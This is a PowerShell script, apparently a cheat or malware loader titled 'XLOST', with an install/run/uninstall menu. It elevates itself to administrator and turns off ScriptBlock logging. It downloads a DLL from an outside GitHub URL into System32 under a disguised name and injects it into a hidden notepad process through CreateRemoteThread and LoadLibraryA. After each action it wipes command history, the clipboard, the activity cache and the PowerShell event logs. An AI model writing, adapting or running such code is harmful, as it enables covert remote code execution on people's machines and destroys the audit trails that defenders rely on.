# 1. Administrator Privileges Check & Auto-Elevation
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 2. Disable PowerShell ScriptBlock Logging temporarily
try {
    $RegistryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (-not (Test-Path $RegistryPath)) {
        New-Item -Path $RegistryPath -Force | Out-Null
    }
    Set-ItemProperty -Path $RegistryPath -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
} catch {}

# Cleanup History & Clipboard
Clear-History
try {
    $HistoryPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $HistoryPath) {
        Clear-Content $HistoryPath -ErrorAction SilentlyContinue
    }
} catch {}

try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    [System.Windows.Forms.Clipboard]::Clear()
} catch {}
cmd.exe /c "echo off | clip" 2>$null
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:LOCALAPPDATA\ConnectedDevicesPlatform\*\ActivitiesCache.db*" -Force -ErrorAction SilentlyContinue
Start-Service -Name "cbdhsvc*" -ErrorAction SilentlyContinue

# 3. Console Styling (ขยายขนาดให้พอดี ป้องกันการเกิด Scrollbar)
$host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
$host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(46, 11)
$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(46, 11)

# 4. Global Paths & Configuration
$global:TargetDir = "C:\Windows\System32"
$global:DllName = "aadtbs.dll"
$global:DllFullPath = Join-Path $global:TargetDir $global:DllName
$global:DirectUrl = "https://raw.githubusercontent.com/punvertwo-sys/DLLXLOST/refs/heads/main/XLOST.dll"

# 5. C# P/Invoke for Windows API (Injection)
$code = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@
Add-Type -TypeDefinition $code -Language CSharp

# 6. Core Functions
function Invoke-InstallDll {
    if (-not (Test-Path $global:TargetDir)) {
        New-Item -ItemType Directory -Force -Path $global:TargetDir | Out-Null
    }

    Write-Host "[*] Downloading package..." -ForegroundColor Cyan
    try {
        $tempFile = Join-Path $env:TEMP "temp_download.dll"
        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }

        Import-Module BitsTransfer -ErrorAction SilentlyContinue
        Start-BitsTransfer -Source $global:DirectUrl -Destination $tempFile -TransferType Download -ErrorAction Stop

        if (Test-Path $global:DllFullPath) {
            Remove-Item $global:DllFullPath -Force
        }
        
        Move-Item -Path $tempFile -Destination $global:DllFullPath -Force
        Write-Host "[+] Installation completed!" -ForegroundColor Green
    }
    catch {
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $webClient.DownloadFile($global:DirectUrl, $tempFile)
            $webClient.Dispose()

            if (Test-Path $global:DllFullPath) {
                Remove-Item $global:DllFullPath -Force
            }
            Move-Item -Path $tempFile -Destination $global:DllFullPath -Force
            Write-Host "[+] Installation completed!" -ForegroundColor Green
        }
        catch {
            Write-Host "[-] Download failed!" -ForegroundColor Red
        }
    }
}

function Invoke-RunInjection {
    if (-not (Test-Path $global:DllFullPath)) {
        Write-Host "[-] Files not found! Install first." -ForegroundColor Red
        return
    }

    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "notepad.exe"
    $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $process = [System.Diagnostics.Process]::Start($startInfo)
    
    Start-Sleep -Milliseconds 800
    $pidNum = $process.Id

    $PROCESS_ALL_ACCESS = 0x001F0FFF
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_EXECUTE_READWRITE = 0x40

    $hProcess = [WinAPI]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pidNum)
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to open process." -ForegroundColor Red
        return
    }

    $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($global:DllFullPath + "`0")
    $allocMem = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
    if ($allocMem -eq [IntPtr]::Zero) {
        Write-Host "[-] Memory allocation failed." -ForegroundColor Red
        return
    }

    $bytesWritten = [IntPtr]::Zero
    $writeResult = [WinAPI]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, [uint32]$dllBytes.Length, [ref]$bytesWritten)
    if (-not $writeResult) {
        Write-Host "[-] Memory write failed." -ForegroundColor Red
        return
    }

    $kernel32 = [WinAPI]::GetModuleHandle("kernel32.dll")
    $loadLibraryAddr = [WinAPI]::GetProcAddress($kernel32, "LoadLibraryA")

    $hThread = [WinAPI]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) {
        Write-Host "[-] Thread creation failed." -ForegroundColor Red
        return
    }

    Write-Host "[+] Injection successful! ($pidNum)" -ForegroundColor Green
}

function Invoke-UninstallDll {
    if (Test-Path $global:DllFullPath) {
        Remove-Item $global:DllFullPath -Force
        Write-Host "[+] Files successfully removed." -ForegroundColor Green
    } else {
        Write-Host "[!] Files do not exist." -ForegroundColor Yellow
    }
}

# 7. Main Menu Loop
do {
    Clear-Host
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
    Write-Host "                 XLOST                    " -ForegroundColor Yellow
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
    Write-Host "  [1]  INSTALL" -ForegroundColor White
    Write-Host "  [2]  RUN" -ForegroundColor White
    Write-Host "  [3]  UNINSTALL" -ForegroundColor White
    Write-Host "  [4]  EXIT" -ForegroundColor White
    Write-Host "──────────────────────────────────────────" -ForegroundColor DarkCyan
    $choice = Read-Host "  SELECT CHOICE [1-4]"

    switch ($choice) {
        '1' {
            Invoke-InstallDll
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
        '2' {
            Invoke-RunInjection
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
        '3' {
            Invoke-UninstallDll
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
        '4' {
            Write-Host " Exiting and clearing traces..." -ForegroundColor Cyan
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 1
            break
        }
        default {
            Write-Host "[!] Invalid option!" -ForegroundColor Red
            Start-Sleep -Seconds 1
        }
    }
} while ($choice -ne '4')
